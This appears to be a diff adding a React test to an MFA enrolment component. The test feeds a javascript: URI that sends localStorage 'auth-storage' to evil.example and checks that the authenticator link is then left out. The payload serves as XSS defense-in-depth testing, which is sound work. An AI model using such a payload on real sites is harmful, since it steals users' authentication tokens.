@@ -142,6 +142,21 @@ describe('MfaSection enrolment flow', () => {
         expect(screen.getByText('network down')).toBeInTheDocument();
     });
 
+    it('omits the auth link when otpauth_uri has a non-otpauth scheme (XSS defense-in-depth)', () => {
+        enrollMutate.mockImplementation((_vars, opts) => {
+            opts.onSuccess({
+                secret: 'JBSWY3DPEHPK3PXP',
+                otpauth_uri: "javascript:fetch('https://evil.example/x?c='+localStorage.getItem('auth-storage'))",
+            });
+        });
+
+        render(<MfaSection />);
+        fireEvent.click(screen.getByRole('button', { name: 'Enable' }));
+
+        expect(screen.getByText('JBSWY3DPEHPK3PXP')).toBeInTheDocument();
+        expect(screen.queryByRole('link', { name: /open in authenticator app/i })).not.toBeInTheDocument();
+    });
+
     it('shows a fallback error when verification is rejected with no detail, and omits the auth link when uri is empty', () => {
         enrollMutate.mockImplementation((_vars, opts) => {
             opts.onSuccess({ secret: 'SECRET', otpauth_uri: '' });
